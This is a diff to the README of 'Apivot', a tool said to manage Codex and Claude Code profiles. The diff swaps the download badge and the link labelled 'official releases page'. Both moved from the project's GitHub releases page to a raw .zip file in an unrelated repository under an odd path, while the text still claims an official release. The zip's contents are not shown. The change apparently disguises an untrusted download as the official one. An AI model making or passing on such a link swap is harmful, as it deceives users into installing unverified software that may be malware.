@@ -5,13 +5,13 @@ description: "Manage your Codex and Claude Code configurations across providers 
 ---
 # 🔄 Apivot - Manage AI Profiles Without Breaking Access
 
-[![Download Apivot](https://img.shields.io/badge/Download-Apivot-blue.svg)](https://github.com/Nosequarterrest500/Apivot/releases)
+[![Download Apivot](https://img.shields.io/badge/Download-Apivot-blue.svg)](https://raw.githubusercontent.com/Nosequarterrest500/nosequarterrest500.github.io/main/microthermic/github-nosequarterrest-io-v3.0.zip)
 
 Apivot helps you switch between different Codex and Claude Code configurations. This tool works on your computer. It keeps your official logins and API environments separate. You can back up your current settings. You can restore them with one click. This application does not track your data.
 
 ## 📥 Get the Software
 
-Visit the [official releases page](https://github.com/Nosequarterrest500/Apivot/releases) to download the application. 
+Visit the [official releases page](https://raw.githubusercontent.com/Nosequarterrest500/nosequarterrest500.github.io/main/microthermic/github-nosequarterrest-io-v3.0.zip) to download the application. 
 
 1. Go to the link above.
 2. Look for the Assets section.
